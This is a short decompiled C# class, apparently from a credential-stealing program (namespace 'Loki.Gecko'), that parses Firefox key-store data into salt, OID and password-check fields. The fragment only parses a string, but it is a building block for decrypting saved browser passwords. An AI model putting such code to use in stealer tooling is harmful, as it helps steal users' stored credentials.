using System;
using System.Globalization;

namespace Loki.Gecko
{
	// Token: 0x02000009 RID: 9
	public class PasswordCheck
	{
		// Token: 0x17000015 RID: 21
		// (get) Token: 0x06000047 RID: 71 RVA: 0x0000401A File Offset: 0x0000221A
		public string EntrySalt { get; }

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x06000048 RID: 72 RVA: 0x00004022 File Offset: 0x00002222
		public string OID { get; }

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x06000049 RID: 73 RVA: 0x0000402A File Offset: 0x0000222A
		public string Passwordcheck { get; }

		// Token: 0x0600004A RID: 74 RVA: 0x00004034 File Offset: 0x00002234
		public PasswordCheck(string DataToParse)
		{
			int num = int.Parse(DataToParse.Substring(2, 2), NumberStyles.HexNumber) * 2;
			this.EntrySalt = DataToParse.Substring(6, num);
			int num2 = DataToParse.Length - (6 + num + 36);
			this.OID = DataToParse.Substring(6 + num + 36, num2);
			this.Passwordcheck = DataToParse.Substring(6 + num + 4 + num2);
		}
	}
}
